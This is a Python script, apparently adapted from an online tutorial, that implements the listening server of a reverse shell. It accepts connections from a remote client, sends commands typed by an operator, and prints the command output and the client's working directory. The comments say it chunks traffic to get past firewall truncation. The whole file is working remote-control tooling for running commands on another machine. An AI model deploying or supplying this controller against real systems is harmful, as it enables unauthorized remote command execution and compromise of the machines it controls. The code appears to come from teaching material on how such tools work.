##### Credits https://www.thepythoncode.com/article/create-reverse-shell-python #####

import sys
import socket
import getopt

def usage():
    print("")
    print("Usage: ")
    print("\tpython shell-server.py [-p <PORT> -b <BUFFER_SIZE>]")
    print("")
    print("Example: ")
    print("\tpython shell-server.py -p 44444 -b 50")
    print("")
    print("Default values:")
    print("\t-p 33333 (must be the same of client)")
    print("\t-b 100 (must be the same of client)")
    print("")
    print("-h or --help for help")
    print("")

def send_word(data, s):
    client_socket, client_address = s.accept()
    client_socket.send(data.encode())
    

def send_data(message, s, word):
    # split data into chunks to avoid connection truncation by the firewall
    chunks = [message[i:i+word] for i in range(0, len(message), word)]
    # send n° of chunks the server has to receive
    send_word(str(len(chunks)), s)
    # send each chunk
    for w in chunks:
        send_word(str(w), s)



def receive_word(s, word):
    client_socket, client_address = s.accept()
    w = client_socket.recv(word).decode()
    return w

def receive_data(s, word):
    # receive the first chunk
    tmp = receive_word(s, word)
    # in case it is "[START]", proceed to read the n° of chunks and their value, otherwise print the message
    if (tmp == "[START]"):
        chunks_count = int(receive_word(s, word))
        message = ""
        for i in range(chunks_count):
            chunk = receive_word(s, word)
            message = message + chunk
    else:
        message = tmp
    return message




## start main

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 33333
BUFFER_SIZE = 100
# separator string to send both the commmand result and the working directory
SEP = "<-->"

try:
    options, args = getopt.getopt(sys.argv[1:], "p:b:h:")
except getopt.GetoptError as error:
    # print help information and exit:
    print(error)  # will print something like "option -a not recognized"
    usage()
    sys.exit(2)

for option, arg in options:
    if option == "-p":
        SERVER_PORT = int(arg)
    elif option == "-b":
        BUFFER_SIZE = int(arg)
    elif option in ("-h", "--help"):
        usage()
        sys.exit()




# create a socket object
s = socket.socket()
# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Buffer size {BUFFER_SIZE}...")
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")


working_dir = receive_data(s, BUFFER_SIZE)
print("[+] Current working directory:", working_dir)



while True:
    ## accept connection for the response
    

    # get the command from prompt
    command = input(f"{working_dir} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    send_data(command, s, BUFFER_SIZE)
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    
    # retrieve command results
    output = receive_data(s, BUFFER_SIZE)

    # split command output and working directory
    results, working_dir = output.split(SEP)
    # print output
    print(results)
